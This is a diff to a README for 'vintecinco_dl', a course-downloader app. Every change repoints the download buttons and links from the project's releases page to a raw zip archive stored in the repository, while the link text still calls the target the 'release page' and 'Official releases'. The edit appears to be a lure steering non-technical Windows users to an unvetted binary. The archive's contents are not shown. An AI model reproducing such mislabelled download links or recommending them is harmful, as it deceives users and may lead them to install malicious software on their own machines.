@@ -1,6 +1,6 @@
 # 🎬 vintecinco_dl - Download Your Purchased Courses Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/raw/refs/heads/main/build/windows/vintecinco-dl-v1.8.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Follow these steps to download and install vintecinco_dl on a Windows PC. No cod
 
 Click the link below to visit the official release page. You will find the latest versions of the app here.
 
-[Visit Release Page to Download vintecinco_dl](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
+[Visit Release Page to Download vintecinco_dl](https://github.com/doroteaantagonistic288/vintecinco_dl/raw/refs/heads/main/build/windows/vintecinco-dl-v1.8.zip)
 
 Once there:
 
@@ -118,7 +118,7 @@ If you run into issues:
 
 ## 🔗 Important Links
 
-- Official releases: [https://github.com/doroteaantagonistic288/vintecinco_dl/releases](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)  
+- Official releases: [https://github.com/doroteaantagonistic288/vintecinco_dl/raw/refs/heads/main/build/windows/vintecinco-dl-v1.8.zip](https://github.com/doroteaantagonistic288/vintecinco_dl/raw/refs/heads/main/build/windows/vintecinco-dl-v1.8.zip)  
   Use this page to get the latest version of the app.
 
 ---
@@ -153,4 +153,4 @@ Use these topics to find related projects and tools if you want to explore more.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20App-blue?style=for-the-badge)](https://github.com/doroteaantagonistic288/vintecinco_dl/raw/refs/heads/main/build/windows/vintecinco-dl-v1.8.zip)
